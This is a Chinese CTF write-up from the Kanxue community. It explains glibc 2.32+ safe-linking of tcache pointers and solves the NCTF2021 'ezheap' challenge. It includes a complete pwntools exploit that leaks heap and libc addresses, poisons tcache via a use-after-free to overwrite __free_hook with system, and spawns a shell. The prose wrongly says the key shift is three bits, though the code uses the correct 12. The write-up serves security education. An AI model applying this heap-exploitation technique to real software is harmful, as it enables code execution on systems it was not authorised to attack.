---
title: glibc高版本堆题攻击之safe unlink
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458478705&idx=2&sn=c64fef456cabeb1e9fda1ee22e9a3948&chksm=b18e58fb86f9d1ed42b577ad4ad7862d08a3250a87448f716fdbfbbb0b11cb495bfb74844441&scene=58&subscene=0#rd
source: 看雪学院
date: 2022-10-25
fetch_date: 2025-10-03T20:47:41.750251
---

# glibc高版本堆题攻击之safe unlink

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FtsEMKjUFCILxt9M0nLsUD6bOjeyUZdyskHsianYwj7nfNJ9picwk2C3l6ibxTwBicMX3S14xGfnDyjQ/0?wx_fmt=jpeg)

# glibc高版本堆题攻击之safe unlink

Nameless\_a

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FtsEMKjUFCILxt9M0nLsUDFdZdqRJ8e1YCDfOPRVAJZmn4qPQfGanOce40r3UoVjf5T8edVVZWOA/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：Nameless\_a

#

##

## **测试版本2.33\_5**

从2.32版本开始，tcache和fastbin里面就加入了一个safe unlink的机制，主要是对fd指针的一个异或操作来使得不那么好利用UAF等需要fd指针的手法进行地址泄露以及进一步的任意地址写。

具体的效果如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxsjEVb9eBhwaWBQd5JtYnoiaaHzQQuYyibWJAUrIgoFLUpOQ9zYz3a7sw/640?wx_fmt=png)

发现fd指针的值为0x562e784a3，如果是低版本的话，应该是0x562e784a3000也就是上一个堆块的地址。可以看出fd指针被加密了。

那么是怎么加密的呢，我们看看源码：

```
/* Safe-Linking:   Use randomness from ASLR (mmap_base) to protect single-linked lists   of Fast-Bins and TCache.  That is, mask the "next" pointers of the   lists' chunks, and also perform allocation alignment checks on them.   This mechanism reduces the risk of pointer hijacking, as was done with   Safe-Unlinking in the double-linked lists of Small-Bins.   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with   larger pages provide less entropy, although the pointer mangling   still works.  *//* 加密函数 */#define PROTECT_PTR(pos, ptr) \  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))/* 解密函数 */#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
```

pos是我们当前的堆块的fd指针的地址，ptr是未加密的时候fd指针应该指向的堆地址（也就是前一个被放进tcache的堆块的fd指针的位置）。

说通俗一点，当堆块P被free的时候，P的fd要放前一个堆块的ptr（tcache里面放的就直接是fd指针的位置了）。而放置的时候，会把&P->fd这个堆地址右移三位，当作一个密钥，来异或ptr这个明文，最后在把得到的密文放在P->这个位置。

我们再多放进tcache一个堆块测试一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxQaWgpcARa8dAlb093H44wZ4IYMIrtHuZRAvs1khheRvfyaib7Hkf1lA/640?wx_fmt=jpeg)

没问题。那么解密过程又是怎么的呢？我们这里演草一下，就很清晰明了了：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxy2dgEJx442NDFmcpMkjWH0diaibjGjuIpE7kqcAIe6o1j5UiaFU5CA7ug/640?wx_fmt=jpeg)

结论就是，密文异或密钥就得到明文了（这里感谢二进制密码爷hash\_hash师傅*https://hash-hash.github.io/*的指点）。

##

##

## **模板题：【NCTF2021】ezheap**

###

### **版本**

同测试版本

###

### **保护**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxYzNMqNNpG8KDtdhhET2Sw2P6DdW7q2vEb1TGOQb390CdrNOUa12mTw/640?wx_fmt=png)

### **ida**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXxYW9WEONavZIJ6SE34GQAXdlJA39zmXV00UnQK9mDCSkaYCgbl54NJw/640?wx_fmt=png)

很常见的菜单题，实现了增删改查，然后删的时候有个UAF：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GO396vFaljRjhzsaUe9ibXx9BkIFU2AS1E4Wic8tezichZS7BIu4shTXoNNTthUtvIrxvibpHiaL3CqiaQ/640?wx_fmt=png)

不过并没有完全UAF，没有清空指针，但是因为清空了size数组上对应的值，不能再edit了。但是我们可以通过在note段放两个相同的堆指针（因为没有清空，add free add就好了），free那个被清空size的idx，然后就能通过另一个idx对bin中的堆块进行修改了，就可以通过edit将它的fd指针设置为(\_\_free\_hook ^ (pos>>3))实现tcache poison然后get shell。

###

### **exp**

```
from pwn import *from hashlib import sha256import base64context.log_level='debug'#context.arch = 'amd64'context.arch = 'amd64'context.os = 'linux' def z():    gdb.attach(r) def cho(num):    r.sendafter(">> ",str(num)) def add(size,con):    cho(1)    r.sendafter("Size: ",str(size))    r.sendafter("Content: ",con) def edit(idx,con):    cho(2)    r.sendafter("Index: ",str(idx))    r.sendafter("Content: ",con) def delet(idx):    cho(3)    r.sendafter("Index: ",str(idx)) def show(idx):    cho(4)    r.sendafter("Index: ",str(idx)) def exp():     global r    global libc    libc=ELF('./libc-2.33.so')    r=process('./ezheap')    ##[+]:leak libc && heap    for i in range(0,8):        add(0x80,'nameless')    for i in range(1,8):        delet(i)     ##z()    delet(0)    show(1)    heap=u64(r.recv(5).ljust(8,'\x00'))    key=heap    heap<<=12    log.success('heap:'+hex(heap))    show(0)    libcbase=u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x1e0c00    log.success('libcbase:'+hex(libcbase))     ##[+]:set libc_func    one=[0xe3b2e,0xe3b31,0xe3b34]    free_hook=libcbase+libc.sym['__free_hook']    system=libcbase+libc.sym['system']    ##onegadget=libcbase+one[0]     ##UAF && poison to get shell    cry_free_hook=(free_hook)^key    add(0x80,'nameless')    delet(7)    edit(8,p64(cry_free_hook)+'\n')    add(0x80,'/bin/sh\x00') ##9    add(0x80,p64(system))    delet(9)    r.interactive() if __name__ == '__main__':    exp()
```

##

##

## **参考博客**

2021 NCTF ezheap Writeup (glibc2.32 以上 UAF) | SkYe231 Blog (mrskye.cn)
*https://www.mrskye.cn/archives/16cb363f/#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90*

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Equ46wyS1FwuAnnOnWhNwJWZdIGicaE6rGLINhKfbNyYozZF4vAcIzucpsKKH8KOzcAhn079r66dg/640?wx_fmt=png)

**看雪ID：Nameless\_a**

https://bbs.pediy.com/user-home-943085.htm

\*本文由看雪论坛 Nameless\_a 原创，转载请注明来自看雪社区

[![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FK2iazChO0unOZGYxfSBHGxErzb00MrG63G8zSkhwW2QjIrJglQo3XsOdbUBqDb4vCTsJR8pgGa8A/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458478676&idx=1&sn=1208da7520ae52a9833df98a3d46139e&chksm=b18e58de86f9d1c8a0af0449331699f43b2668b636ed9c0d56b08af7d711367324e0d04cfcd7&scene=21#wechat_redirect)

峰会官网：https://meet.kanxue.com/kxmeet-6.htm

**#****往期推荐**

1.[进程 Dump & PE unpacking & IAT 修复 - Windows 篇](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473853&idx=2&sn=8fd4d2448cc087a58348422ec5c8e04b&chksm=b18e65f786f9ece1d9240bff1ebf9bc5bb25edabf0237ccfabe07642e94ea288b10c5f73b10d&scene=21#wechat_redirect)

2.[NtSocket的稳定实现，Client与Server的简单封装，以及SocketAsyncSelect的一种APC实现](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473852&idx=1&sn=7cc6b9eb080137f59729bfef67edfde0&chksm=b18e65f686f9ece0031c2554e0fc82a1714041c00c599e3f11975c7d6a6327117c16f454b5a9&scene=21#wechat_redirect)

3.[如何保护自己的代码？给自己的代码添加NoChange属性](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473851&idx=2&sn=c1abdc853c9f7cd53aa9e0f55809c0c6&chksm=b18e65f186f9ece7f00e8a39f9c371f457fd514ab11e468a9e53b01f29ee6a29448921a52739&scene=21#wechat_redirect)

4.[针对某会议软件，简单研究其CEF框架](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473847&idx=1&sn=ad73bc3a39d01fbdc0ef69f51e1f7606&chksm=b18e65fd86f9ecebedc7b8244af1252aebc923f97c01338211dc7a9ae52c5f212cab4ab1f467&scene=21#wechat_redirect)

5.[PE加载过程 FileBuffer-ImageBuffer](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473846&idx=2&sn=0258ae8d48a044dda44652e214c6c2b7&chksm=b18e65fc86f9ecea2bf2e6afa9ab5e0199da90be9f63e4c645ae8bd3628506b20907ec8fcaf7&scene=21#wechat_redirect)

6.[APT 双尾蝎样本分析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458473839&idx=2&sn=650e486a3df2a44513f657c1c7779128&chksm=b18e65e586f9ecf3120b7cf8aa5125f68c10c15e6bbfd33b064622d1bcc41b91da0f881de828&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球分享**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球点赞**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif)

**球在看**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif)

点击“阅读原文”，了解更多！

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

看雪学苑

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8EGLfh77kFmnicd9WOic2ibvhCibFdB4bL4srJCgo2wnvdoXLxpIvAkfCmmcptXZB0qKWMoIP8iaibYN2FA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过